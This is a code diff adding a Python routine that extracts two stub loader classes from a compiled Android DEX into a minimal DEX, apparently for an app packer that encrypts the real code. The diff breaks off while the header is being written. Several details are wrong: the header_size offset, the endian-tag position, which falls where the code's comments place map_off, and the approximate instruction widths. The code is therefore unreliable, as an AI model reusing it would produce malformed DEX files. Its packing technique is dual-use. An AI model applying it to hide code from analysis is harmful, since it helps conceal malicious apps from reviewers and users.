@@ -1548,18 +1548,895 @@ def _generate_dex_stub_smali(new_path: str) -> str:
 """
 
 
-def step_9b_encrypt_dex(real_dex: bytes) -> tuple:
+def _build_stub_dex(real_dex: bytes, new_path: str, renamed_app: str) -> bytes:
+    """
+    Extract ONLY the two stub classes (DexStub + renamed App) from the fully
+    compiled DEX and emit a valid minimal DEX-035 containing just those two
+    class_defs with all their referenced strings/types/protos/fields/methods/code.
+
+    Algorithm:
+      1. Parse DEX-035 header → locate all section offsets/sizes.
+      2. Walk class_def_item list; keep entries whose type descriptor matches
+         L<new_path>/DexStub;  or  L<new_path>/<renamed_app>;
+      3. Collect the transitive closure of all items those two class_defs reference
+         (strings, types, protos, fields, methods, code_items, annotations, etc.)
+         by walking their class_data and method code offsets.
+      4. Re-index every id (string_id, type_id, proto_id, field_id, method_id)
+         to a compact new table containing only the kept items.
+      5. Serialise a valid DEX-035 with the compact tables and update the header
+         (file_size, checksum, SHA-1, map offsets).
+
+    Returns raw bytes of the minimal stub DEX.
+    """
+    import struct as _s
+    import hashlib as _hl
+    import zlib as _zl
+
+    data = real_dex
+
+    # ── 1. Parse header ────────────────────────────────────────────────────────
+    def u32(off): return _s.unpack_from("<I", data, off)[0]
+    def u16(off): return _s.unpack_from("<H", data, off)[0]
+
+    magic = data[:8]
+    # Accept dex\n035\0 or dex\n039\0
+    if not magic.startswith(b"dex\n"):
+        raise ValueError(f"_build_stub_dex: not a DEX file (magic={magic!r})")
+
+    header_size   = u32(0x08 + 4*1)   # offset 0x0C
+    # Standard DEX header layout (offsets from DEX spec):
+    # 0x00 magic(8) checksum(4) sha1(20) file_size(4) header_size(4) endian(4)
+    # 0x28 link_size(4) link_off(4)
+    # 0x30 map_off(4)
+    # 0x34 string_ids_size(4) string_ids_off(4)
+    # 0x3C type_ids_size(4)   type_ids_off(4)
+    # 0x44 proto_ids_size(4)  proto_ids_off(4)
+    # 0x4C field_ids_size(4)  field_ids_off(4)
+    # 0x54 method_ids_size(4) method_ids_off(4)
+    # 0x5C class_defs_size(4) class_defs_off(4)
+    # 0x64 data_size(4)       data_off(4)
+
+    str_ids_size = u32(0x34);  str_ids_off  = u32(0x38)
+    typ_ids_size = u32(0x3C);  typ_ids_off  = u32(0x40)
+    pro_ids_size = u32(0x44);  pro_ids_off  = u32(0x48)
+    fld_ids_size = u32(0x4C);  fld_ids_off  = u32(0x50)
+    met_ids_size = u32(0x54);  met_ids_off  = u32(0x58)
+    cls_defs_size= u32(0x5C);  cls_defs_off = u32(0x60)
+
+    # ── 2. Build string table (index → raw string bytes incl MUTF-8 length) ───
+    str_data_offsets = [u32(str_ids_off + i*4) for i in range(str_ids_size)]
+
+    def read_mutf8_str(off):
+        """Return (char_len, byte_len, raw_bytes_no_nul) at data offset off."""
+        pos = off
+        b = data[pos]; pos += 1
+        if b & 0x80:
+            char_len = ((b & 0x7F) << 8) | data[pos]; pos += 1
+        else:
+            char_len = b
+        b = data[pos]; pos += 1
+        if b & 0x80:
+            byte_len = ((b & 0x7F) << 8) | data[pos]; pos += 1
+        else:
+            byte_len = b
+        raw = data[pos: pos + byte_len]
+        return char_len, byte_len, raw
+
+    def str_value(idx):
+        """Return decoded string for string index idx."""
+        _, _, raw = read_mutf8_str(str_data_offsets[idx])
+        return raw.decode("utf-8", errors="replace")
+
+    # ── 3. Build type descriptor list ─────────────────────────────────────────
+    type_str_idx = [u32(typ_ids_off + i*4) for i in range(typ_ids_size)]
+
+    def type_desc(tid): return str_value(type_str_idx[tid])
+
+    # ── 4. Identify the two target class_defs ─────────────────────────────────
+    STUB_DESC = f"L{new_path}/DexStub;"
+    APP_DESC  = f"L{new_path}/{renamed_app};"
+
+    CLASS_DEF_SIZE = 32   # 8 × uint32
+    target_class_idxs = []   # indices into class_def list
+    for ci in range(cls_defs_size):
+        off = cls_defs_off + ci * CLASS_DEF_SIZE
+        class_type_idx = u32(off)
+        desc = type_desc(class_type_idx)
+        if desc in (STUB_DESC, APP_DESC):
+            target_class_idxs.append(ci)
+
+    if len(target_class_idxs) != 2:
+        found = []
+        for ci in range(cls_defs_size):
+            off = cls_defs_off + ci * CLASS_DEF_SIZE
+            found.append(type_desc(u32(off)))
+        raise ValueError(
+            f"_build_stub_dex: expected 2 stub classes, found {len(target_class_idxs)}.\n"
+            f"Looking for: {STUB_DESC!r}, {APP_DESC!r}\n"
+            f"First 20 class descriptors in DEX: {found[:20]}"
+        )
+
+    print(f"  [stub_dex] Found target classes at def indices: {target_class_idxs}")
+
+    # ── 5. Collect referenced ids transitively ────────────────────────────────
+    kept_str_idxs  = set()
+    kept_typ_idxs  = set()
+    kept_pro_idxs  = set()
+    kept_fld_idxs  = set()
+    kept_met_idxs  = set()
+
+    # Proto_id_item: shorty_idx(u32), return_type_idx(u32), params_off(u32)
+    def collect_proto(pid):
+        if pid in kept_pro_idxs: return
+        kept_pro_idxs.add(pid)
+        base = pro_ids_off + pid * 12
+        shorty_idx   = u32(base)
+        ret_type_idx = u32(base + 4)
+        params_off   = u32(base + 8)
+        kept_str_idxs.add(shorty_idx)
+        collect_type(ret_type_idx)
+        if params_off:
+            # type_list: size(u32) + type_idx[size](u16 each)
+            count = u32(params_off)
+            for k in range(count):
+                t = u16(params_off + 4 + k*2)
+                collect_type(t)
+
+    def collect_type(tid):
+        if tid in kept_typ_idxs: return
+        kept_typ_idxs.add(tid)
+        kept_str_idxs.add(type_str_idx[tid])
+
+    def collect_field(fid):
+        if fid in kept_fld_idxs: return
+        kept_fld_idxs.add(fid)
+        # field_id_item: class_idx(u16), type_idx(u16), name_idx(u32)
+        base = fld_ids_off + fid * 8
+        collect_type(u16(base))
+        collect_type(u16(base + 2))
+        kept_str_idxs.add(u32(base + 4))
+
+    def collect_method(mid):
+        if mid in kept_met_idxs: return
+        kept_met_idxs.add(mid)
+        # method_id_item: class_idx(u16), proto_idx(u16), name_idx(u32)
+        base = met_ids_off + mid * 8
+        collect_type(u16(base))
+        collect_proto(u16(base + 2))
+        kept_str_idxs.add(u32(base + 4))
+
+    def collect_code_item(code_off):
+        """Scan code_item for string/type/field/method references in bytecode."""
+        if not code_off: return
+        # code_item header: registers_size(u16), ins_size(u16), outs_size(u16),
+        #   tries_size(u16), debug_info_off(u32), insns_size(u32), insns[insns_size](u16)
+        tries_size = u16(code_off + 6)
+        insns_size = u32(code_off + 12)
+        insns_start = code_off + 16
+        # Walk instructions looking for const-string (0x1A, 0x1B),
+        # const-class (0x1C), new-instance (0x22), check-cast (0x1F),
+        # invoke-* (0x6E-0x72, 0x74-0x78), iget/iput (0x52-0x5F),
+        # sget/sput (0x60-0x6D), instance-of (0x20), new-array (0x23),
+        # filled-new-array (0x24,0x25)
+        pos = insns_start
+        end = insns_start + insns_size * 2
+        while pos < end:
+            if pos + 2 > len(data): break
+            opcode = data[pos]
+            # Determine instruction size and extract index
+            if opcode in (0x1A,):          # const-string vA, string@BBBB
+                if pos + 4 <= len(data):
+                    sidx = u16(pos + 2)
+                    kept_str_idxs.add(sidx)
+                pos += 4
+            elif opcode in (0x1B,):        # const-string/jumbo vAA, string@BBBBBBBB
+                if pos + 6 <= len(data):
+                    sidx = _s.unpack_from("<I", data, pos + 2)[0]
+                    kept_str_idxs.add(sidx)
+                pos += 6
+            elif opcode in (0x1C, 0x1F, 0x20, 0x22, 0x23):  # const-class/check-cast/instance-of/new-instance/new-array
+                if pos + 4 <= len(data):
+                    tidx = u16(pos + 2)
+                    collect_type(tidx)
+                pos += 4
+            elif opcode in (0x24, 0x25):   # filled-new-array
+                if pos + 6 <= len(data):
+                    tidx = u16(pos + 2)
+                    collect_type(tidx)
+                pos += 6
+            elif 0x52 <= opcode <= 0x6D:   # iget/iput/sget/sput families
+                if pos + 4 <= len(data):
+                    fidx = u16(pos + 2)
+                    collect_field(fidx)
+                pos += 4
+            elif 0x6E <= opcode <= 0x72:   # invoke-* (5-reg form)
+                if pos + 6 <= len(data):
+                    midx = u16(pos + 2)
+                    collect_method(midx)
+                pos += 6
+            elif 0x74 <= opcode <= 0x78:   # invoke-*/range
+                if pos + 6 <= len(data):
+                    midx = u16(pos + 2)
+                    collect_method(midx)
+                pos += 6
+            elif opcode == 0x00:           # nop / packed-switch-payload / sparse-switch-payload / fill-array-data
+                if pos + 2 > len(data): break
+                pseudo = u16(pos)
+                if pseudo == 0x0100:       # packed-switch-payload
+                    if pos + 4 > len(data): break
+                    sz = u16(pos + 2)
+                    pos += 8 + sz * 4
+                elif pseudo == 0x0200:     # sparse-switch-payload
+                    if pos + 4 > len(data): break
+                    sz = u16(pos + 2)
+                    pos += 4 + sz * 8
+                elif pseudo == 0x0300:     # fill-array-data-payload
+                    if pos + 8 > len(data): break
+                    elem = u16(pos + 2)
+                    sz   = u32(pos + 4)
+                    total = 8 + (elem * sz + 1) // 2 * 2
+                    pos += total
+                else:
+                    pos += 2
+            else:
+                # Use a simple width table for remaining opcodes
+                # width = (opcode_width_table[opcode]) — approximate
+                # Dalvik instruction widths by format:
+                # 1-unit: 0x00-0x0D range, returns, etc.
+                # 2-unit: most compare/move/arith
+                # 3-unit: invoke-*, goto/32, etc.
+                if opcode in (0x28,):      # goto (1-unit label)
+                    pos += 2
+                elif opcode in (0x29,):    # goto/16
+                    pos += 4
+                elif opcode in (0x2A,):    # goto/32
+                    pos += 6
+                elif opcode in (0x26, 0x2B, 0x2C):  # fill-array / packed-switch / sparse-switch
+                    pos += 6
+                elif opcode in (0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19,
+                                0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21):
+                    pos += 4  # fallback for 2-unit
+                else:
+                    pos += 2  # safest fallback: 1-unit (advance and keep going)
+
+    def read_uleb128(off):
+        result = 0; shift = 0; pos = off
+        while True:
+            b = data[pos]; pos += 1
+            result |= (b & 0x7F) << shift
+            if not (b & 0x80): break
+            shift += 7
+        return result, pos - off
+
+    def collect_class_data(class_data_off):
+        if not class_data_off: return
+        pos = class_data_off
+        # class_data_item: uleb128 × 4 counts, then field/method items
+        sf_count, n = read_uleb128(pos); pos += n
+        if_count, n = read_uleb128(pos); pos += n
+        dm_count, n = read_uleb128(pos); pos += n
+        vm_count, n = read_uleb128(pos); pos += n
+
+        def read_encoded_fields(count):
+            nonlocal pos
+            idx = 0
+            for _ in range(count):
+                diff, n = read_uleb128(pos); pos += n
+                idx += diff
+                _flags, n = read_uleb128(pos); pos += n
+                collect_field(idx)
+
+        def read_encoded_methods(count):
+            nonlocal pos
+            idx = 0
+            for _ in range(count):
+                diff,  n = read_uleb128(pos); pos += n
+                idx += diff
+                _flags, n = read_uleb128(pos); pos += n
+                code_off, n = read_uleb128(pos); pos += n
+                collect_method(idx)
+                collect_code_item(code_off)
+
+        read_encoded_fields(sf_count)
+        read_encoded_fields(if_count)
+        read_encoded_methods(dm_count)
+        read_encoded_methods(vm_count)
+
+    # Walk the two target class_defs
+    for ci in target_class_idxs:
+        base = cls_defs_off + ci * CLASS_DEF_SIZE
+        class_type_idx    = u32(base)
+        superclass_idx    = u32(base +  4)   # 0xFFFFFFFF = none
+        interfaces_off    = u32(base +  8)
+        source_file_idx   = u32(base + 12)   # 0xFFFFFFFF = none
+        annotations_off   = u32(base + 16)
+        class_data_off    = u32(base + 20)
+        static_values_off = u32(base + 24)
+
+        collect_type(class_type_idx)
+        if superclass_idx != 0xFFFFFFFF:
+            collect_type(superclass_idx)
+        if source_file_idx != 0xFFFFFFFF:
+            kept_str_idxs.add(source_file_idx)
+        if interfaces_off:
+            count = u32(interfaces_off)
+            for k in range(count):
+                collect_type(u16(interfaces_off + 4 + k*2))
+        collect_class_data(class_data_off)
+        # static_values_off: encoded_array; we copy the raw bytes later, no id refs needed
+
+    # ── 6. Build compact re-mapping tables ────────────────────────────────────
+    # Sort kept sets to get deterministic ordering
+    new_str_ids  = sorted(kept_str_idxs)
+    new_typ_ids  = sorted(kept_typ_idxs)
+    new_pro_ids  = sorted(kept_pro_idxs)
+    new_fld_ids  = sorted(kept_fld_idxs)
+    new_met_ids  = sorted(kept_met_idxs)
+
+    str_remap = {old: new for new, old in enumerate(new_str_ids)}
+    typ_remap = {old: new for new, old in enumerate(new_typ_ids)}
+    pro_remap = {old: new for new, old in enumerate(new_pro_ids)}
+    fld_remap = {old: new for new, old in enumerate(new_fld_ids)}
+    met_remap = {old: new for new, old in enumerate(new_met_ids)}
+
+    print(f"  [stub_dex] Compact tables: {len(new_str_ids)} str, {len(new_typ_ids)} type, "
+          f"{len(new_pro_ids)} proto, {len(new_fld_ids)} field, {len(new_met_ids)} method")
+
+    # ── 7. Serialise the new DEX ───────────────────────────────────────────────
+    # We build sections as bytearrays, then lay them out after the 112-byte header.
+    # Alignment: string_id/type_id/proto_id/field_id/method_id/class_def = 4-byte aligned.
+    # string_data_item = no alignment. code_item = 4-byte aligned.
+
+    def uleb128(v):
+        out = []
+        while True:
+            b = v & 0x7F; v >>= 7
+            if v: out.append(b | 0x80)
+            else: out.append(b); break
+        return bytes(out)
+
+    def align4(buf):
+        r = len(buf) % 4
+        if r: buf += b'\x00' * (4 - r)
+        return buf
+
+    def pack32(*vals): return _s.pack("<" + "I"*len(vals), *vals)
+    def pack16(*vals): return _s.pack("<" + "H"*len(vals), *vals)
+
+    # ── 7a. String data section ───────────────────────────────────────────────
+    str_data_sec = bytearray()
+    str_data_rel_offsets = []   # offset within str_data_sec for each new string
+    for old_idx in new_str_ids:
+        str_data_rel_offsets.append(len(str_data_sec))
+        char_len, byte_len, raw = read_mutf8_str(str_data_offsets[old_idx])
+        # Re-encode length prefix exactly as in source (MUTF-8 ULEB128 pair)
+        # char_len first, then byte_len, then raw bytes, then NUL
+        def encode_len(v):
+            if v >= 0x80:
+                return bytes([(v >> 8) | 0x80, v & 0xFF])
+            return bytes([v])
+        str_data_sec += encode_len(char_len) + encode_len(byte_len) + raw + b'\x00'
+
+    # ── 7b. Type-list blobs needed by proto parameters ────────────────────────
+    # Collect raw type_list blobs for proto params, re-mapped
+    proto_param_blobs = {}   # new proto idx → bytes (or b'' if no params)
+    for old_pid in new_pro_ids:
+        base = pro_ids_off + old_pid * 12
+        params_off = u32(base + 8)
+        if params_off:
+            count = u32(params_off)
+            blob = pack32(count)
+            for k in range(count):
+                old_t = u16(params_off + 4 + k*2)
+                blob += pack16(typ_remap[old_t])
+            blob = align4(bytearray(blob))
+            proto_param_blobs[pro_remap[old_pid]] = bytes(blob)
+        else:
+            proto_param_blobs[pro_remap[old_pid]] = b''
+
+    # ── 7c. Remap and copy code_items ─────────────────────────────────────────
+    # We'll copy the code bytes verbatim but re-index references inline.
+    # Strategy: copy the full code_item raw bytes from source, then patch
+    # the instruction stream for any 16/32-bit index references.
+
+    def remap_code_item(code_off):
+        """Return remapped raw code_item bytes."""
+        if not code_off: return b''
+        tries_size = u16(code_off + 6)
+        insns_size = u32(code_off + 12)
+        insns_end  = code_off + 16 + insns_size * 2
+        # tries are 4-byte aligned after insns
+        if tries_size and (insns_size % 2):
+            padding = 2
+        else:
+            padding = 0
+        tries_end = insns_end + padding + tries_size * 8
+        # handlers follow tries
+        # We take the full raw span and patch indices in-place
+        # Determine full code_item size: walk handlers if present
+        handlers_end = tries_end
+        if tries_size:
+            # encoded_catch_handler_list
+            n_list, nb = read_uleb128(tries_end)
+            hpos = tries_end + nb
+            for _ in range(n_list):
+                n_pairs, nb = read_uleb128(hpos); hpos += nb
+                catch_all = (n_pairs <= 0)
+                for _ in range(abs(n_pairs)):
+                    _, nb = read_uleb128(hpos); hpos += nb  # type_idx
+                    _, nb = read_uleb128(hpos); hpos += nb  # handler addr
+                if catch_all:
+                    _, nb = read_uleb128(hpos); hpos += nb  # catch_all addr
+            handlers_end = hpos
+
+        raw = bytearray(data[code_off: handlers_end])
+
+        # Patch instruction stream (same walk as collect_code_item)
+        base_in_raw = 16   # insns start at offset 16 within code_item
+        pos = base_in_raw
+        end = base_in_raw + insns_size * 2
+        while pos < end:
+            if pos >= len(raw): break
+            opcode = raw[pos]
+            if opcode in (0x1A,):          # const-string BBBB
+                if pos + 4 <= len(raw):
+                    old_s = _s.unpack_from("<H", raw, pos+2)[0]
+                    _s.pack_into("<H", raw, pos+2, str_remap[old_s])
+                pos += 4
+            elif opcode in (0x1B,):        # const-string/jumbo BBBBBBBB
+                if pos + 6 <= len(raw):
+                    old_s = _s.unpack_from("<I", raw, pos+2)[0]
+                    _s.pack_into("<I", raw, pos+2, str_remap[old_s])
+                pos += 6
+            elif opcode in (0x1C, 0x1F, 0x20, 0x22, 0x23):
+                if pos + 4 <= len(raw):
+                    old_t = _s.unpack_from("<H", raw, pos+2)[0]
+                    _s.pack_into("<H", raw, pos+2, typ_remap[old_t])
+                pos += 4
+            elif opcode in (0x24, 0x25):
+                if pos + 6 <= len(raw):
+                    old_t = _s.unpack_from("<H", raw, pos+2)[0]
+                    _s.pack_into("<H", raw, pos+2, typ_remap[old_t])
+                pos += 6
+            elif 0x52 <= opcode <= 0x6D:
+                if pos + 4 <= len(raw):
+                    old_f = _s.unpack_from("<H", raw, pos+2)[0]
+                    _s.pack_into("<H", raw, pos+2, fld_remap[old_f])
+                pos += 4
+            elif 0x6E <= opcode <= 0x72:
+                if pos + 6 <= len(raw):
+                    old_m = _s.unpack_from("<H", raw, pos+2)[0]
+                    _s.pack_into("<H", raw, pos+2, met_remap[old_m])
+                pos += 6
+            elif 0x74 <= opcode <= 0x78:
+                if pos + 6 <= len(raw):
+                    old_m = _s.unpack_from("<H", raw, pos+2)[0]
+                    _s.pack_into("<H", raw, pos+2, met_remap[old_m])
+                pos += 6
+            elif opcode == 0x00:
+                if pos + 2 > len(raw): break
+                pseudo = _s.unpack_from("<H", raw, pos)[0]
+                if pseudo == 0x0100:
+                    sz = _s.unpack_from("<H", raw, pos+2)[0]
+                    pos += 8 + sz * 4
+                elif pseudo == 0x0200:
+                    sz = _s.unpack_from("<H", raw, pos+2)[0]
+                    pos += 4 + sz * 8
+                elif pseudo == 0x0300:
+                    elem = _s.unpack_from("<H", raw, pos+2)[0]
+                    sz   = _s.unpack_from("<I", raw, pos+4)[0]
+                    total = 8 + (elem * sz + 1) // 2 * 2
+                    pos += total
+                else:
+                    pos += 2
+            elif opcode in (0x28,): pos += 2
+            elif opcode in (0x29,): pos += 4
+            elif opcode in (0x2A, 0x26, 0x2B, 0x2C): pos += 6
+            else: pos += 2
+
+        # Patch catch-handler type indices in tries section
+        if tries_size:
+            hpos = tries_end - code_off   # offset within raw
+            n_list, nb = read_uleb128(code_off + (hpos))
+            # re-walk to patch type_idx uleb128s — they're not aligned so
+            # we do an in-place byte walk; since type count rarely exceeds 127
+            # the uleb128 is 1 byte and safe to patch in place
+            hpos2 = tries_end + nb
+            for _ in range(n_list):
+                v, nb = read_uleb128(hpos2); hpos2 += nb
+                catch_all = (v <= 0)
+                for _ in range(abs(v)):
+                    old_t_off = hpos2
+                    old_t, nb = read_uleb128(hpos2); hpos2 += nb
+                    _, nb2 = read_uleb128(hpos2); hpos2 += nb2
+                    new_t = typ_remap.get(old_t, old_t)
+                    # patch only if 1-byte uleb128
+                    rel = old_t_off - code_off
+                    if rel < len(raw) and new_t < 0x80:
+                        raw[rel] = new_t
+                if catch_all:
+                    _, nb = read_uleb128(hpos2); hpos2 += nb
+
+        return bytes(raw)
+
+    # Walk class_data again to collect code_item raw bytes in order
+    # We store: method_id (new) → remapped code bytes
+    met_code_map = {}   # new method_id → remapped raw code_item bytes
+
+    def harvest_code(class_data_off):
+        if not class_data_off: return
+        pos = class_data_off
+        sf_count, n = read_uleb128(pos); pos += n
+        if_count, n = read_uleb128(pos); pos += n
+        dm_count, n = read_uleb128(pos); pos += n
+        vm_count, n = read_uleb128(pos); pos += n
+
+        def skip_encoded_fields(count):
+            nonlocal pos
+            idx = 0
+            for _ in range(count):
+                diff, n = read_uleb128(pos); pos += n; idx += diff
+                _, n    = read_uleb128(pos); pos += n
+
+        def harvest_encoded_methods(count):
+            nonlocal pos
+            idx = 0
+            for _ in range(count):
+                diff,  n = read_uleb128(pos); pos += n; idx += diff
+                _flags, n = read_uleb128(pos); pos += n
+                code_off, n = read_uleb128(pos); pos += n
+                new_mid = met_remap[idx]
+                if code_off and new_mid not in met_code_map:
+                    met_code_map[new_mid] = remap_code_item(code_off)
+
+        skip_encoded_fields(sf_count)
+        skip_encoded_fields(if_count)
+        harvest_encoded_methods(dm_count)
+        harvest_encoded_methods(vm_count)
+
+    for ci in target_class_idxs:
+        base = cls_defs_off + ci * CLASS_DEF_SIZE
+        harvest_code(u32(base + 20))
+
+    # ── 7d. Copy static_values blobs verbatim (no index refs inside) ──────────
+    # encoded_array_item: just uleb128 sizes + values. String/type refs inside
+    # use indices that we cannot easily patch without a full encoded_value parser.
+    # For the two stub classes the static values are booleans (sDone=false) and
+    # a null object (sLoader=null) — no string/type index inside, safe to copy raw.
+    static_val_blobs = {}   # new class_def order → raw bytes
+    for order, ci in enumerate(target_class_idxs):
+        base = cls_defs_off + ci * CLASS_DEF_SIZE
+        sv_off = u32(base + 24)
+        if sv_off:
+            # Determine encoded_array size by copying until we hit a length we
+            # trust — simplest: copy from sv_off to the next aligned 4-byte item
+            # We read the size uleb128 then each encoded_value (1+ bytes each)
+            pos2 = sv_off
+            size, nb = read_uleb128(pos2); pos2 += nb
+            for _ in range(size):
+                vtype = data[pos2] & 0x1F
+                varg  = (data[pos2] >> 5) & 0x07
+                pos2 += 1 + varg   # value_type determines extra bytes
+            static_val_blobs[order] = bytes(data[sv_off:pos2])
+        else:
+            static_val_blobs[order] = b''
+
+    # ── 8. Layout calculation ──────────────────────────────────────────────────
+    # Fixed order: header(112) | string_ids | type_ids | proto_ids | field_ids |
+    #   method_ids | class_defs | data(string_data + type_lists + code_items +
+    #   class_data + static_values + map_list)
+
+    HDR = 112
+    STR_IDS_SZ  = len(new_str_ids) * 4
+    TYP_IDS_SZ  = len(new_typ_ids) * 4
+    PRO_IDS_SZ  = len(new_pro_ids) * 12
+    FLD_IDS_SZ  = len(new_fld_ids) * 8
+    MET_IDS_SZ  = len(new_met_ids) * 8
+    CLS_DEF_SZ  = 2 * 32           # exactly 2 class_defs
+
+    str_ids_start = HDR
+    typ_ids_start = str_ids_start + STR_IDS_SZ
+    pro_ids_start = typ_ids_start + TYP_IDS_SZ
+    fld_ids_start = pro_ids_start + PRO_IDS_SZ
+    met_ids_start = fld_ids_start + FLD_IDS_SZ
+    cls_def_start = met_ids_start + MET_IDS_SZ
+
+    data_start = cls_def_start + CLS_DEF_SZ   # start of data section
+
+    # Build data section piecewise
+    data_sec = bytearray()
+
+    def ds_align4():
+        nonlocal data_sec
+        r = len(data_sec) % 4
+        if r: data_sec += b'\x00' * (4 - r)
+
+    # ── 8a. String data items ─────────────────────────────────────────────────
+    abs_str_data_offsets = []
+    for i, rel in enumerate(str_data_rel_offsets):
+        abs_str_data_offsets.append(data_start + len(data_sec))
+        # find slice in str_data_sec
+        next_rel = str_data_rel_offsets[i+1] if i+1 < len(str_data_rel_offsets) else len(str_data_sec)
+        data_sec += str_data_sec[rel:next_rel]
+
+    ds_align4()
+
+    # ── 8b. Type-list blobs (proto parameters) ────────────────────────────────
+    proto_param_abs = {}   # new proto idx → absolute offset (0 if none)
+    for new_pid in range(len(new_pro_ids)):
+        blob = proto_param_blobs.get(new_pid, b'')
+        if blob:
+            ds_align4()
+            proto_param_abs[new_pid] = data_start + len(data_sec)
+            data_sec += blob
+        else:
+            proto_param_abs[new_pid] = 0
+
+    # ── 8c. Code items (4-byte aligned each) ──────────────────────────────────
+    met_code_abs = {}   # new method_id → absolute offset
+    for new_mid in sorted(met_code_map.keys()):
+        raw_code = met_code_map[new_mid]
+        ds_align4()
+        met_code_abs[new_mid] = data_start + len(data_sec)
+        data_sec += raw_code
+
+    ds_align4()
+
+    # ── 8d. Class data items ──────────────────────────────────────────────────
+    class_data_abs = []   # [abs_off, ...] for each of the 2 class_defs in order
+
+    def build_class_data(ci):
+        base = cls_defs_off + ci * CLASS_DEF_SIZE
+        class_data_off = u32(base + 20)
+        if not class_data_off:
+            class_data_abs.append(0)
+            return
+
+        # Read the four counts
+        pos4 = class_data_off
+        sf_count, n = read_uleb128(pos4); pos4 += n
+        if_count, n = read_uleb128(pos4); pos4 += n
+        dm_count, n = read_uleb128(pos4); pos4 += n
+        vm_count, n = read_uleb128(pos4); pos4 += n
+
+        cd2 = bytearray()
+        cd2 += uleb128(sf_count)
+        cd2 += uleb128(if_count)
+        cd2 += uleb128(dm_count)
+        cd2 += uleb128(vm_count)
+
+        # Re-encode fields: each item is (diff_from_prev, access_flags) in uleb128.
+        # old index is accumulated; we remap to new index and re-delta-encode.
+        prev_old_f = 0
+        prev_new_f = 0
+        for fi in range(sf_count + if_count):
+            diff,  n = read_uleb128(pos4); pos4 += n
+            flags, n = read_uleb128(pos4); pos4 += n
+            old_fid = prev_old_f + diff
+            new_fid = fld_remap[old_fid]
+            cd2 += uleb128(new_fid - prev_new_f)
+            cd2 += uleb128(flags)
+            prev_old_f = old_fid
+            prev_new_f = new_fid
+
+        # Re-encode methods: (diff, access_flags, code_off) each uleb128.
+        prev_old_m = 0
+        prev_new_m = 0
+        for mi in range(dm_count + vm_count):
+            diff,   n = read_uleb128(pos4); pos4 += n
+            flags,  n = read_uleb128(pos4); pos4 += n
+            _code,  n = read_uleb128(pos4); pos4 += n
+            old_mid = prev_old_m + diff
+            new_mid = met_remap[old_mid]
+            abs_c   = met_code_abs.get(new_mid, 0)
+            cd2 += uleb128(new_mid - prev_new_m)
+            cd2 += uleb128(flags)
+            cd2 += uleb128(abs_c)
+            prev_old_m = old_mid
+            prev_new_m = new_mid
+
+        ds_align4()
+        class_data_abs.append(data_start + len(data_sec))
+        data_sec += cd2
+
+    for ci in target_class_idxs:
+        build_class_data(ci)
+
+    ds_align4()
+
+    # ── 8e. Static value blobs ────────────────────────────────────────────────
+    static_val_abs = {}
+    for order, ci in enumerate(target_class_idxs):
+        blob = static_val_blobs.get(order, b'')
+        if blob:
+            static_val_abs[order] = data_start + len(data_sec)
+            data_sec += blob
+        else:
+            static_val_abs[order] = 0
+
+    ds_align4()
+
+    # ── 8f. Map list ──────────────────────────────────────────────────────────
+    # map_list: size(u32) + map_item[size] { type(u16) pad(u16) size(u32) offset(u32) }
+    # Required map item types for a valid DEX:
+    #   0x0000 TYPE_HEADER_ITEM
+    #   0x0001 TYPE_STRING_ID_ITEM
+    #   0x0002 TYPE_TYPE_ID_ITEM
+    #   0x0003 TYPE_PROTO_ID_ITEM
+    #   0x0004 TYPE_FIELD_ID_ITEM
+    #   0x0005 TYPE_METHOD_ID_ITEM
+    #   0x0006 TYPE_CLASS_DEF_ITEM
+    #   0x2002 TYPE_STRING_DATA_ITEM
+    #   0x2003 TYPE_TYPE_LIST (if any proto has params)
+    #   0x2001 TYPE_CODE_ITEM
+    #   0x2000 TYPE_CLASS_DATA_ITEM
+    #   0x2004 TYPE_MAP_LIST
+    #   0x1003 TYPE_ENCODED_ARRAY_ITEM (if any static values)
+
+    map_off = data_start + len(data_sec)
+
+    map_items = []
+    map_items.append((0x0000, 1,             0))              # HEADER
+    map_items.append((0x0001, len(new_str_ids), str_ids_start))
+    if new_typ_ids:
+        map_items.append((0x0002, len(new_typ_ids), typ_ids_start))
+    if new_pro_ids:
+        map_items.append((0x0003, len(new_pro_ids), pro_ids_start))
+    if new_fld_ids:
+        map_items.append((0x0004, len(new_fld_ids), fld_ids_start))
+    if new_met_ids:
+        map_items.append((0x0005, len(new_met_ids), met_ids_start))
+    map_items.append((0x0006, 2,             cls_def_start))  # CLASS_DEF
+
+    # String data: all contiguous from abs_str_data_offsets[0]
+    if abs_str_data_offsets:
+        map_items.append((0x2002, len(new_str_ids), abs_str_data_offsets[0]))
+
+    # Type lists
+    type_list_offs = sorted(set(v for v in proto_param_abs.values() if v))
+    if type_list_offs:
+        map_items.append((0x2003, len(type_list_offs), type_list_offs[0]))
+
+    # Code items
+    code_offs = sorted(set(met_code_abs.values()))
+    if code_offs:
+        map_items.append((0x2001, len(code_offs), code_offs[0]))
+
+    # Class data
+    cd_offs = sorted(set(v for v in class_data_abs if v))
+    if cd_offs:
+        map_items.append((0x2000, len(cd_offs), cd_offs[0]))
+
+    # Encoded array (static values)
+    sv_offs = sorted(set(v for v in static_val_abs.values() if v))
+    if sv_offs:
+        map_items.append((0x1003, len(sv_offs), sv_offs[0]))
+
+    map_items.append((0x1000, 1, map_off))                    # MAP_LIST
+
+    # Sort map items by offset (required by DEX spec)
+    map_items.sort(key=lambda x: x[2])
+
+    map_sec = bytearray()
+    map_sec += pack32(len(map_items))
+    for (mtype, msize, moff) in map_items:
+        map_sec += pack16(mtype, 0)   # type + padding
+        map_sec += pack32(msize, moff)
+
+    data_sec += map_sec
+
+    total_size = data_start + len(data_sec)
+
+    # ── 9. Assemble the full DEX ───────────────────────────────────────────────
+    dex = bytearray(total_size)
+
+    # Header magic — use same version as source
+    dex[0:8] = data[0:8]
+    # endian tag = 0x12345678
+    _s.pack_into("<I", dex, 0x28 + 8, 0x12345678)
+
+    # Section offsets into header
+    _s.pack_into("<I", dex, 0x34, len(new_str_ids));  _s.pack_into("<I", dex, 0x38, str_ids_start)
+    _s.pack_into("<I", dex, 0x3C, len(new_typ_ids));  _s.pack_into("<I", dex, 0x40, typ_ids_start if new_typ_ids else 0)
+    _s.pack_into("<I", dex, 0x44, len(new_pro_ids));  _s.pack_into("<I", dex, 0x48, pro_ids_start if new_pro_ids else 0)
+    _s.pack_into("<I", dex, 0x4C, len(new_fld_ids));  _s.pack_into("<I", dex, 0x50, fld_ids_start if new_fld_ids else 0)
